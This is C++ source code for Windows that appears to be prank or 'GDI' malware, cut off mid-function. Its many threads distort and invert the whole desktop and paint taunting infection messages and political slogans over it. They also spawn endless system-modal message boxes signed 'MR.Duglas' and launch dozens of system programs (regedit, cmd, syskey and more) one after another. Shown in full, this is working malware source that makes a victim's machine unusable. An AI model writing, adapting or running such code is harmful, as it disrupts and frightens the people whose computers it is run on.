#include <windows.h>
#include <iostream>
#define USE_MATH_DEFINES 1
#include <cmath>
#define M_PI 3.14159265358979323846

//#include "file_pc.h"

#pragma  comment(lib,"WinMM.lib")

#include <cstdlib>


#include <stdlib.h>




#include <TlHelp32.h>
#include <Shlwapi.h>
#include <Psapi.h>
#include <CommCtrl.h>
//void strReverseW(LPWSTR str);


#include <iostream>

#include <stdlib.h>

//#include "effect.cpp"

#include <mmsystem.h>

using namespace std;

#include <intrin.h>

//#include <Windows.h>
#include <WinNT.h>
#include <stdint.h>


DWORD WINAPI sub_1(LPVOID lpvd)
{
	HDC desk = GetDC(0);
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	double rotaision = 0;
	while (true)
	{
		desk = GetDC(0);
		for (float i = 0; i < x + y; i += 0.99f)
		{
			int a = sin(rotaision) * 20;
			BitBlt(desk, i, 0, 1, y, desk, i, a, SRCCOPY);
			rotaision += M_PI / 80;
		}
	}
}
DWORD WINAPI sub_2(LPVOID lpvd)
{
	HDC desk = GetDC(0);
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	double rotaision = 0;
	while(true)
	{
		desk = GetDC(0);
		for(float i = 0; i < x + y;  i +=0.99f)
		{
			int a = sin(rotaision) * 20;
			BitBlt(desk, i, 0, 1, y,desk, i, a, SRCCOPY);
			rotaision += M_PI / 80;
		}
		for (float i1 = 0; i1 < x + y; i1 += 0.99f)
		{
			int a = sin(rotaision) * 20;
			BitBlt(desk, 0, i1, x, 1, desk, a, i1, SRCCOPY);
			rotaision += M_PI / 80;
		}
	}
}

DWORD WINAPI sub_8(LPVOID lpvd)
{
	HDC DC = GetDC(0);
	int v3;
	int v4 = 0;
	int v5;
	int v6;

	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	v3 = w; //no idea why it sets this 
	v6 = h;

	
	if (v3 <= 0)
		v4 = 0;
	while (v4 < v3)
	{
		v5 = 0;
		if (h > 0)
		{
			while (v5 < v6)
			{
				StretchBlt(DC, v4, v5, 14, 14, DC, v4 + 4, v5 + 4, 10, 10, SRCCOPY);
				StretchBlt(DC, v4, v5, 14, 14, DC, v4, v5, 10, 10, SRCCOPY);
				h = v6;
				v5 += 10;
			}
			v3 = w;
		}
		v4 += 10;
	}
	return 0;
}

DWORD WINAPI sub_9(LPVOID lpvd)
{
	HDC hdc = GetDC(0);
	HWND hwnd = GetDesktopWindow();
	RECT rekt;
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);

	while (true)
	{
		GetWindowRect(hwnd, &rekt);
		StretchBlt(hdc, 25, 25, rekt.right - 50, rekt.bottom - 50, hdc, sw, sh, -sw, -sh, NOTSRCCOPY);
		Sleep(1000);
	}
	return 0;
}

DWORD WINAPI sub_10(LPVOID lpvd)
{
	HDC desk = GetDC(0);
	int x = GetSystemMetrics(0); int y = GetSystemMetrics(1);
	LPCSTR text = 0;
	LPCSTR text1 = 0;
	LPCSTR text2 = 0;
	LPCSTR text3 = 0;
	for (;;) 
	{
		SetBkMode(desk, 0);
		text = "Yor computer has been infected";
		text1 = "Ha-ha-ha-ha-ha-ha";
		text2 = "USA is bad contory!!!";
		text3 = "Russia is very good!!!";
		SetTextColor(desk, RGB(rand() % 255, rand() % 255, rand() % 255));
		HFONT font = CreateFontA(43, 32, 0, 0, FW_THIN, 0, 1, 0, ANSI_CHARSET, 0, 0, 0, 0, "Baby Kruffy");
		SelectObject(desk, font);
		TextOutA(desk, rand() % x, rand() % y, text, strlen(text));
		Sleep(10);
		TextOutA(desk, rand() % x, rand() % y, text1, strlen(text1));
		Sleep(10);
		TextOutA(desk, rand() % x, rand() % y, text2, strlen(text2));
		Sleep(10);
		TextOutA(desk, rand() % x, rand() % y, text3, strlen(text3));
		//Sleep(500);
		DeleteObject(font);
	}
}

DWORD WINAPI sub_11(LPVOID lpvd) 
{
	while(true)
	{
	
		HDC desk = GetDC(0);
		int x = GetSystemMetrics(SM_CXSCREEN),
			y = GetSystemMetrics(SM_CYSCREEN);
		POINT p1[3];
		p1[0].x = rand() % x;
		p1[0].y = rand() % y;
		p1[1].x = rand() % x;
		p1[1].y = rand() % y;
		p1[2].x = rand() % x;
		p1[2].y = rand() % y;
		HRGN gh = CreatePolygonRgn(p1, rand() % 5, ALTERNATE);
		HBRUSH hbr = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(desk, hbr);
		PaintRgn(desk, gh);
		Sleep(10);
		Pie(desk, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
		Sleep(10);
		ArcTo(desk, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
		Sleep(10);
		Arc(desk, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
		Sleep(10);
		LineTo(desk, rand() % x, rand() % y);
		Sleep(10);
		Ellipse(desk, rand() % x, rand() % y, rand() % x, rand() % y);
		Sleep(10);
		Chord(desk, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y, rand() % x, rand() % y);
		
	}
}


DWORD WINAPI sub_20(LPVOID lpvd)
{
	HDC desk;
	int sw, sh;
	while(true)
	{
		desk = GetDC(0);
		sw = GetSystemMetrics(0);
		sh = GetSystemMetrics(1);
		SetStretchBltMode(desk, HALFTONE);
		StretchBlt(desk, 0, -20, sw, sh + 40, desk, 0, 0, sw, sh, SRCCOPY);
		StretchBlt(desk, -20, 0, sw + 40, sh, desk, 0, 0, sw, sh, SRCCOPY);
		ReleaseDC(NULL, desk);
	}
}

DWORD WINAPI sub_12(LPVOID lpvd)
{
	int screen_w = GetSystemMetrics(0);
	int screen_h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	POINT pt;
	int xs = 100;
	int ys = 100;
	POINT p1;
	int steepcounter = 0;
	int soedbrush = 0;
	
	HDC v1; // r13
	int v2; // ebx
	__int64 v3; // rbp
	int v4; // edi
	int v5; // er14
	int v6; // er15
	int v7; // er12
	int v8; // eax
	int v9; // esi
	double v10; // xmm6_8
	HICON v11; // rdi
	float v12; // xmm1_4
	float v13; // xmm0_4
	int v15; // [rsp+98h] [rbp+10h]
	int v16; // [rsp+A0h] [rbp+18h]
	int x = 10;
	int y = 10;
	v1 = GetDC(0i64);
	v15 = GetSystemMetrics(0);
	v2 = v15;
	v3 = 32518i64;
	v4 = GetSystemMetrics(1);
	v16 = v4;
	double angle = 0;
	if (NULL != 1)
	{
		steepcounter += 1;
		//GetCursorPos(&pt);


		v5 = v15 / 14;
		do
		{
			v6 = rand() % v2;
			v7 = rand() % v4;
			v8 = rand() % 4;
			if (v8)
			{
				if (v8 == 1)
				{
					v3 = 32515i64;
				}
				else if (v8 == 3)
				{
					v3 = 32516i64;
				}
			}
			else
			{
				v3 = 32513i64;
			}
			v9 = 0;
			if (v5 > 0)
			{
				x += incrementor * signX;
				y += incrementor * signY;
				do
				{
					v10 = (double)(v9 + 300);
					v11 = LoadIconW(0i64, (LPCWSTR)v3);
					v12 = sin((double)(v9)) * (double)v9 + 0;
					v13 = cos((double)(v9)) * (double)v9 + 0;
					DrawIcon(v1, x + (int)v12, y + (int)v13, v11);
					//Sleep(0);
					if (NULL == 1)
						break;
					v9 += 1;
				} while (v9 < v5);
				v2 = v15;
				v4 = v16;
			}

			if (y == GetSystemMetrics(SM_CYSCREEN))
			{
				signY = -1;
			}

			if (x == GetSystemMetrics(SM_CXSCREEN))
			{
				signX = -1;
			}

			if (y == 0)
			{
				signY = 1;
			}

			if (x == 0)
			{
				signX = 1;
			}

			InvalidateRect(0i64, 0i64, 0);
		} while (NULL != 1);
	}
}

VOID WINAPI ci(int x, int y, int w, int h)
{
	HDC hdc = GetDC(0);
	HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
	SelectClipRgn(hdc, hrgn);
	BitBlt(hdc, x, y, w, h, hdc, x, y, NOTSRCCOPY);
	DeleteObject(hrgn);
}
VOID WINAPI ci1(int x1, int y1, int w1, int h1)
{
	HDC hdc = GetDC(0);

	BitBlt(hdc, x1, y1, w1, h1, hdc, x1, y1, NOTSRCCOPY);
	ReleaseDC(NULL, hdc);
}

DWORD WINAPI sub_7(LPVOID lpParam) {
	RECT rect;
	GetWindowRect(GetDesktopWindow(), &rect);
	int w = rect.right - rect.left - 500, h = rect.bottom - rect.top - 500;
	int w1 = rect.right - rect.left, h1 = rect.bottom - rect.top;


	for (int t = 0;; t++)
	{
		const int size = 700;
		const int size1 = 700;
		int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;
		int x1 = rand() % (w1 + size1) - size1 / 2, y1 = rand() % (h1 + size1) - size1 / 2;

		for (int i = 0; i < size; i += 100)
		{
			ci(x - i / 2, y - i / 2, i, i);
			ci1(x1 - i / 2, y1 - i / 2, i, i);
			Sleep(25);
		}
	}
}

DWORD WINAPI sub_100(LPVOID lpvd)
{

	int x = 100;
	int y = 100;
	int x1 = 100;
	int y1 = 100;
	int screen_w = GetSystemMetrics(0);
	int screen_h = GetSystemMetrics(1);
	int w = x + 100;
	int h = y + 100;
	int w1 = x1 + 100;
	int h1 = x1 + 100;
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	POINT pt;
	int xs = 100;
	int ys = 100;
	POINT p1;
	int steepcounter = 0;
	int soedbrush = 0;

	HBRUSH hold;
	HRGN hrgn;
	HRGN hrgn1;
	HPEN h2;
	HDC desk = GetDC(NULL);
	hold = CreateSolidBrush(0xff);
	while (true)
	{
		steepcounter += 1;
		GetCursorPos(&pt);

		x += incrementor * signX;
		y += incrementor * signY;
		w += incrementor * signX;
		h += incrementor * signY;
		x1 += incrementor * signX1;
		y1 += incrementor * signY1;
		w1 += incrementor * signX1;
		h1 += incrementor * signY1;

		desk = GetDC(NULL);
		h2 = CreatePen(0, 2, 0xffffff);

		if (steepcounter == 20)
		{
			soedbrush += 1;
			switch (soedbrush)
			{
			case 1:
				hold = CreateSolidBrush(0xa5ff);
				break;
			case 2:
				hold = CreateSolidBrush(0xffff);
				break;
			case 3:
				hold = CreateSolidBrush(0xff00);
				break;
			case 4:
				hold = CreateSolidBrush(0xffff00);
				break;
			case 5:
				hold = CreateSolidBrush(0xff0000);
				break;
			case 6:
				hold = CreateSolidBrush(0xd30094);
				break;
			case 7:
				hold = CreateSolidBrush(0xff00ff);
				break;
			case 8:
				hold = CreateSolidBrush(0xff);
				soedbrush = 0;
				break;
			}
			steepcounter = 0;
		}

		SelectObject(desk, hold);
		SelectObject(desk, h2);
		Ellipse(desk, x, y, w, h);
		//PaintRgn(desk, hrgn);
		//PaintRgn(desk, hrgn1);
		if (h == GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (w == GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (y == 0)
		{
			signY = 1;
		}

		if (x == 0)
		{
			signX = 1;
		}
	}
	
}

DWORD WINAPI sub_5(LPVOID lpvd)
{
	HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	RECT wRect;
	POINT wPt[3];
	HDC desckMem = CreateCompatibleDC(desk); 
	for (;;) {
		desk = GetDC(0);
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left + rand() % sw;
		wPt[0].y = wRect.top - rand() % sh;
		wPt[1].x = wRect.right - rand() % sw;
		wPt[1].y = wRect.top + rand() % sh;
		wPt[2].x = wRect.left * rand() % sw;
		wPt[2].y = wRect.bottom + rand() % sh;
		PlgBlt(desk, wPt, desk, 0, 0, sw, sh, 0, 0, 0);
		BitBlt(desk, 0, 0, sw, sh, desckMem, 0, 0, !(rand() % 2) ? !(rand() % 2) ? SRCAND : SRCPAINT : !(rand() % 2) ? !(rand() % 2) ? SRCINVERT : SRCPAINT : !(rand() % 2) ? SRCAND : !(rand() % 2) ? SRCERASE : NOTSRCERASE);
		ReleaseDC(wnd, desk);
		DeleteDC(desk); DeleteObject(wnd); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&wRect); DeleteObject(&wPt);
	}
}

static ULONGLONG r, n;
int randy() { return n = r, n ^= 0x8ebf635bee3c6d25, n ^= n << 5 | n >> 26, n *= 0xf3e05ca5c43e376b, r = n, n & 0x7fffffff; }

DWORD WINAPI sub_6(LPVOID lpvd)
{
	int tymez = GetTickCount();
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w + h * w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for(int i = 0;; i++, i %= 3)
	{
		if (!i)RedrawWindow(0, 0, 0, 133);
		HDC dick = GetDC(0); HDC dickMem = CreateCompatibleDC(dick); HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(dickMem, hbm);
		BitBlt(dickMem, 0, 0, w, h, dick, 0, 0, NOTSRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		int v = 0;
		int q3 = w ^ h | q3;
		BYTE byte = 0;
		if ((GetTickCount() - tymez) > 60000)
			byte = randy() & 0xff;
		for (int i = 0; w * h > i; i++)
		{
			if (i % h == 0 && randy() % 100 == 0)
				v = randy() % 50;
				((BYTE*)(data + i))[v % q3] +=   ((
				BYTE*)(data + i + 
				v))[v] ^ 
				byte;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(dick, randy() % 3 - 1, randy() % 3 - 1, w, h, dickMem, 0, 0, SRCERASE);
	}
}

DWORD WINAPI sub_4(LPVOID lpvd)
{
	HDC getsa = GetDC(0);
	POINT pt;
	int x = GetSystemMetrics(SM_CXICON) / 2;
	int y = GetSystemMetrics(SM_CYICON) / 2;
	while(true)
	{
		GetCursorPos(&pt);
		DrawIcon(getsa, pt.x - x, pt.y - y, LoadIcon(NULL, IDI_ERROR));
		DrawIcon(getsa, pt.x - 50, pt.y - 50, LoadIcon(NULL, IDI_ASTERISK));
		DrawIcon(getsa, pt.x - 100, pt.y - 100, LoadIcon(NULL, IDI_APPLICATION));
		DrawIcon(getsa, pt.x - 150, pt.y - 150, LoadIcon(NULL, IDI_WARNING));
		DrawIcon(getsa, pt.x - 200, pt.y - 200, LoadIcon(NULL, IDI_QUESTION));
	}
}

DWORD WINAPI sub_3(LPVOID lpvd)
{
	int v4; // [rsp+58h] [rbp-18h]
	int y; // [rsp+5Ch] [rbp-14h]
	int v6; // [rsp+60h] [rbp-10h]
	int v7; // [rsp+64h] [rbp-Ch]
	HDC hdc; // [rsp+68h] [rbp-8h]
	hdc = GetDC(0i64);
	while (1)
	{
		v7 = GetSystemMetrics(1);
		v6 = GetSystemMetrics(0);
		y = rand() % v7;
		v4 = rand() % 5;
		if (v4)
		{
			if (v4 == 1)
				BitBlt(hdc, 0, y, v6, 15, hdc, 1, y, 0xCC0020u);
		}
		else
		{
			BitBlt(hdc, 1, y, v6, 15, hdc, 0, y, 0xCC0020u);
		}
	}
}
HCRYPTPROV prov1;

int random1() {

	if (prov1 == NULL)
		if (!CryptAcquireContext(&prov1, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
			ExitProcess(1);

	int out;
	CryptGenRandom(prov1, sizeof(out), (BYTE*)(&out));
	return out & 0x7fffffff;
}
LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		CREATESTRUCT* pcs = ((CBT_CREATEWND*)lParam)->lpcs;
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
			HWND hwnd = (HWND)wParam;
			int x = random1() % (w - pcs->cx);
			int y = random1() % (h - pcs->cy);

			pcs->x = x;
			pcs->y = y;
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}

DWORD WINAPI sub_13(LPVOID lpvd)
{

	HDC v1; // r12
	int v2; // er15
	int v3; // eax
	int v4; // ecx
	int v5; // ebp
	double v6; // xmm12_8
	int i; // esi
	int j; // edi
	int v9; // eax
	double v10; // xmm8_8
	double v12; // xmm7_8
	int v13; // ebx
	int v15; // ebx
	int v16; // eax
	double v17; // xmm0_8 // xmm6_8
	int k; // [rsp+D8h] [rbp+10h]

	v1 = GetDC(0i64);
	v2 = GetSystemMetrics(0);
	v3 = GetSystemMetrics(1);
	v4 = NULL;
	v5 = v3;
	
		v6 = (double)v3;
		int h = v3 ^ v2 | h;
		int w = v3 - v2 * h >> w + 123 ^ v3 / v2;
		while (1)
		{
			for (i = 1; i < v2; ++i)
			{
				if (v4 == 1)
					break;
				for (j = 1; j < v5; ++j)
				{
					v9 = rand();
					v10 = sin((double)(i + v9 % j) + v2 * 23 / v3 - h);
					v12 = cos((double)(i * (v9 % (j % v5)) * h + 23 / v2));
					v13 = rand() % v2;
					v15 = (unsigned __int8)((i % (unsigned int)j) - tanf((v13 + i * (v9 % 30) + 100))) << 6;
					v16 = rand();
					v17 = ceil((double)(v16 % j) + v12 * v6 / (double)v2 - 100.0 + (double)v2 + h * (v3 + v2));
					SetPixel(v1, i, j, v15 | (unsigned __int8)(int)((double)(i * j) * v10) | ((unsigned __int8)(int)v17 << 12 ^ v3 | v2) >> w);
					
					if (NULL == 1)
						break;
				}
			}
		}
	

}

DWORD WINAPI sub_14(LPVOID lpvd)
{
	HDC hdc = GetDC(0);
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	HWND Wnd = GetDesktopWindow();
    POINT pt[3];
	int t = M_PI * M_PI * M_PI;
	RECT rect;
	GetWindowRect(Wnd, &rect);
	while(true)
	{
		pt[0].x = rect.left + t;
		pt[0].y = rect.top - sin(t);
		pt[1].x = rect.right + t;
		pt[1].y = rect.top + t;
		pt[2].x = rect.left - t;
		pt[2].y = rect.bottom - t;
		PlgBlt(hdc, pt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		
	}
}

DWORD WINAPI sub_15(LPVOID lpvd)
{	
	for (;;) 
	{
		HDC hdc = GetDC(0); 
		int x = GetSystemMetrics(0);
		int	y = GetSystemMetrics(1);
		BITMAPINFO bitmapinfo = { 40UL, x, y, 1, 24 };
		PRGBTRIPLE colorrgb;
		HBITMAP hbitmap = CreateDIBSection(hdc, &bitmapinfo, 0, (void**)&colorrgb, 0, 0);
		HDC DESKTOPBITMAP = CreateCompatibleDC(hdc);
		SelectObject(DESKTOPBITMAP, hbitmap);
		BitBlt(DESKTOPBITMAP, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < x * y; i++) {
			int v = i % x ^ v | x;
			int	i1 = i / y ^ v | y;
			int	r = i1 ^ i1 | (v * i1);
			colorrgb[i].rgbtBlue += v ^ i1 | i * i * 5;
			colorrgb[i].rgbtGreen += v ^ i1 | i - i * 2;
			colorrgb[i].rgbtRed += v ^ i1 | i + i * 1;
		}
		BitBlt(hdc, 0, 0, x, y, DESKTOPBITMAP, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		DeleteDC(hdc);
		DeleteDC(DESKTOPBITMAP);
		DeleteObject(hbitmap);
		DeleteObject(colorrgb); 
		DeleteObject(&x); 
		DeleteObject(&y); 
		DeleteObject(&bitmapinfo);
	}

}

DWORD WINAPI sub_17(LPVOID lpvd)
{
	while (true)
	{
		HDC deskMem;
		HDC desk;
		HBITMAP bm;
		int x = GetSystemMetrics(0);
		int y = GetSystemMetrics(1);

		desk = GetDC(0);
		deskMem = CreateCompatibleDC(desk);
		bm = CreateCompatibleBitmap(desk, x, y);
		SelectObject(deskMem, bm);
		BitBlt(deskMem, 0, 0, x, 200, desk, 0, y - 200, SRCCOPY);
		BitBlt(desk, 0, 0, x, y, desk, 0, -200, SRCCOPY);
		BitBlt(desk, 0, 0, x, 200, deskMem, 0, 0, SRCCOPY);
		BitBlt(deskMem, 0, 0, 200, y, desk, x - 200, 0, SRCCOPY);
		BitBlt(desk, 0, 0, x, y, desk, -200, 0, SRCCOPY);
		BitBlt(desk, 0, 0, 200, y, deskMem, 0, 0, SRCCOPY);
		Sleep(100);
	}
}

POINT mkp(int x, int y) {
	POINT p;
	p.x = x;
	p.y = y;
	return p;
}
LPCWSTR okayButton = L"WOW!";
LRESULT CALLBACK messageBoxHookButton(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode < 0)
		return CallNextHookEx(0, nCode, wParam, lParam);

	LPCWPRETSTRUCT msg = (LPCWPRETSTRUCT)lParam;

	if (msg->message == WM_INITDIALOG) {
		HWND btn = GetDlgItem(msg->hwnd, 2);
		SetWindowTextW(btn, okayButton);
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}
LPCWSTR okayButton1 = L"Run AWAY";
LRESULT CALLBACK messageBoxHookButton1(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode < 0)
		return CallNextHookEx(0, nCode, wParam, lParam);

	LPCWPRETSTRUCT msg = (LPCWPRETSTRUCT)lParam;

	if (msg->message == WM_INITDIALOG) {
		HWND btn = GetDlgItem(msg->hwnd, 2);
		SetWindowTextW(btn, okayButton1);
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}

LPCWSTR okayButton2 = L"Yes,S34t";
LRESULT CALLBACK messageBoxHookButton2(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode < 0)
		return CallNextHookEx(0, nCode, wParam, lParam);

	LPCWPRETSTRUCT msg = (LPCWPRETSTRUCT)lParam;

	if (msg->message == WM_INITDIALOG) {
		HWND btn = GetDlgItem(msg->hwnd, 2);
		SetWindowTextW(btn, okayButton2);
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}

DWORD WINAPI MessageThread(LPVOID parameter) {
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	HHOOK hook1 = SetWindowsHookEx(WH_CALLWNDPROCRET, messageBoxHookButton, 0, GetCurrentThreadId());
	string Message;
	for (int i = 0; i < 20; i++) {
		Message[i] = (char)(33 + random1() % 94);
	}
	MessageBox(NULL, L"Your PC has Ben ... by MR.Duglas", L"LOL", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
	UnhookWindowsHookEx(hook);
	UnhookWindowsHookEx(hook1);

	return 0;
}
DWORD WINAPI MessageThread1(LPVOID parameter) {
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	HHOOK hook1 = SetWindowsHookEx(WH_CALLWNDPROCRET, messageBoxHookButton1, 0, GetCurrentThreadId());
	string Message;
	for (int i = 0; i < 20; i++) {
		Message[i] = (char)(33 + random1() % 94);
	}
	MessageBox(NULL, L"Run Away", L"Run Away", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
	UnhookWindowsHookEx(hook);
	UnhookWindowsHookEx(hook1);

	return 0;
}

DWORD WINAPI MessageThread2(LPVOID parameter) {
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	HHOOK hook1 = SetWindowsHookEx(WH_CALLWNDPROCRET, messageBoxHookButton2, 0, GetCurrentThreadId());
	string Message;
	for (int i = 0; i < 20; i++) {
		Message[i] = (char)(33 + random1() % 94);
	}
	MessageBox(NULL, L"MacOS is very S34t!", L"Mr.Duglas", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
	UnhookWindowsHookEx(hook);
	UnhookWindowsHookEx(hook1);

	return 0;
}

DWORD WINAPI MSGBX(LPVOID parameter) {
	for (;;) {
		CreateThread(NULL, 4096, &MessageThread, NULL, NULL, NULL);
		Sleep(500);
	}
}

DWORD WINAPI MSGBX1(LPVOID parameter) {
	for (;;) {
		CreateThread(NULL, 4096, &MessageThread1, NULL, NULL, NULL);
		Sleep(500);
	}
}

DWORD WINAPI MSGBX2(LPVOID parameter) {
	for (;;) {
		CreateThread(NULL, 4096, &MessageThread2, NULL, NULL, NULL);
		Sleep(500);
	}
}

DWORD WINAPI _MSG(LPVOID parameter) {
	MessageBox(NULL, L"", L"TOO LATE", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
	return 0;
}

DWORD WINAPI sub_16(LPVOID lpvd)
{
	while (true)
	{
		HDC desk = GetDC(0);
		int x = GetSystemMetrics(0),
			y = GetSystemMetrics(1),
			l = rand() % x,
			t = rand() % y,
			w = 128,
			h = 128;
		BitBlt(desk, l + (((rand() % 3) - 1) * 4), t + (((rand() % 3) - 1) * 4), w, h, desk, 1, t, SRCCOPY);
		ReleaseDC(NULL, desk);
	}

}

DWORD WINAPI sub_18(LPVOID lpvd)
{
	HDC desk = GetDC(0);
	int incrementor = 10;
	int x = 0;
	int y = 0;
	CURSORINFO cor;
	int signX = 1;
	int signY = 1;
	while (true)
	{
		x += incrementor * signX;
		y += incrementor * signY;
		GetCursorInfo(&cor);
		cor.cbSize = sizeof(cor);
		DrawIcon(desk, x, y, cor.hCursor);
	
		if (y == GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (x == GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (y == 0)
		{
			signY = 1;
		}

		if (x == 0)
		{
			signX = 1;
		}
	
		Sleep(10);
	}
}

DWORD WINAPI sub_19(LPVOID lpcd)
{
	system("start regedit.exe");
	Sleep(1000);
	system("start NOTEPAD.exe");
	Sleep(1000);
	system("start explorer.exe");
	Sleep(1000);
	system("start accwiz.exe");
	Sleep(1000);
	system("start _default");
	Sleep(1000);
	system("start charmap.exe");
	Sleep(1000);
	system("start calc.exe");
	Sleep(1000);
	system("start certmgr.msc");
	Sleep(1000);
	system("start ciadv.msc");
	Sleep(1000);
	system("start cipher.exe");
	Sleep(1000);
	system("start chkdsk.exe");
	Sleep(1000);
	system("start cleanmgr.exe");
	Sleep(1000);
	system("start cliconfg.exe");
	Sleep(1000);
	system("start cliconf.chm");
	Sleep(1000);
	system("start clipbrd.exe");
	Sleep(1000);
	system("start cmd.exe");
	Sleep(1000);
	system("start cmd.exe");
	Sleep(1000);
	system("start cmd.exe");
	Sleep(1000);
	system("start cmd.exe");
	Sleep(1000);
	system("start cmd.exe");
	Sleep(1000);
	system("start cmd.exe");
	Sleep(1000);
	system("start cmd.exe");
	Sleep(1000);
	system("start cmmgr32.hlp");
	Sleep(1000);
	system("start cmstp.exe");
	Sleep(1000);
	system("start comp.exe");
	Sleep(1000);
	system("start compact.exe");
	Sleep(1000);
	system("start compmgmt.msc");
	Sleep(1000);
	system("start control.exe");
	Sleep(1000);
	system("start cscript.exe");
	Sleep(1000);
	system("start dcomcnfg.exe");
	Sleep(1000);
	system("start ddeshare.exe");
	Sleep(1000);
	system("start devmgmt.msc");
	Sleep(1000);
	system("start dfrg.msc");
	Sleep(1000);
	system("start diskmgmt.msc");
	Sleep(1000);
	system("start driverquery.exe");
	Sleep(1000);
	system("start drwatson.exe");
	Sleep(1000);
	system("start drwtsn32.exe");
	Sleep(1000);
	system("start edit.com");
	Sleep(1000);
	system("start dxdiag.exe");
	Sleep(1000);
	system("start edit.hlp");
	Sleep(1000);
	system("start esentutl.exe");
	Sleep(1000);
	system("start eudcedit.exe");
	Sleep(1000);
	system("start eventvwr.msc");
	Sleep(1000);
	system("start freecell.exe");
	Sleep(1000);
	system("start fsquirt.exe");
	Sleep(1000);
	system("start gpedit.msc");
	Sleep(1000);
	system("start cmd.exe");
	Sleep(1000);
	system("start fsmgmt.msc");
	Sleep(1000);
	system("start help.exe");
	Sleep(1000);
	system("start grpconv.exe");
	Sleep(1000);
	system("start iexpress.exe");
	Sleep(1000);
	system("start narrator.exe");
	Sleep(1000);
	system("start mplay32.exe");
	Sleep(1000);
	system("start osk.exe");
	Sleep(1000);
	system("start spider.exe");
	Sleep(1000);
	system("start sndrec32.exe");
	Sleep(1000);
	system("start mshearts.exe");
	Sleep(1000);
	system("start mspaint.exe");
	Sleep(1000);
	system("start ");
	Sleep(1000);
	system("start ");
	Sleep(1000);
	system("start ");
	Sleep(1000);
	system("start ");
	Sleep(1000);
	system("start ");
	Sleep(1000);
	system("start ");
	Sleep(1000);
	system("start ");
	Sleep(1000);
	system("start mstsc.exe");
	Sleep(1000);
	system("start msswchx.exe");
	Sleep(1000);
	system("start netsetup.exe");
	Sleep(1000);
	system("start napstat.exe");
	Sleep(1000);
	system("start net.hlp");
	Sleep(1000);
	system("start ntbackup.exe");
	Sleep(1000);
	system("start ntsd.exe");
	Sleep(1000);
	system("start ntmsoprq.msc");
	Sleep(1000);
	system("start ntmsmgr.msc");
	Sleep(1000);
	system("start nwscript.exe");
	Sleep(1000);
	system("start odbcconf.exe");
	Sleep(1000);
	system("start nw16.exe");
	Sleep(1000);
	system("start ntoskrnl.exe");
	Sleep(1000);
	system("start qappsrv.exe");
	Sleep(1000);
	system("start rcimlby.exe");
	Sleep(1000);
	system("start reg.exe");
	Sleep(1000);
	system("start regedt32.exe");
	Sleep(1000);
	system("start rsop.msc");
	Sleep(1000);
	system("start secedit.exe");
	Sleep(1000);
	system("start sc.exe");
	Sleep(1000);
	system("start sndrec32.exe");
	Sleep(1000);
	system("start sndvol32.exe");
	Sleep(1000);
	system("start sol.exe");
	Sleep(1000);
	system("start spider.exe");
	Sleep(1000);
	system("start mqtgsvc.exe");
	Sleep(1000);
	system("start mqsvc.exe");
	Sleep(1000);
	system("start odbcad32.exe");
	Sleep(1000);
	system("start packager.exe");
	Sleep(1000);
	system("start syskey.exe");
	Sleep(1000);
	system("start sysedit.exe");
	Sleep(1000);
	system("start telnet.exe");
	Sleep(1000);
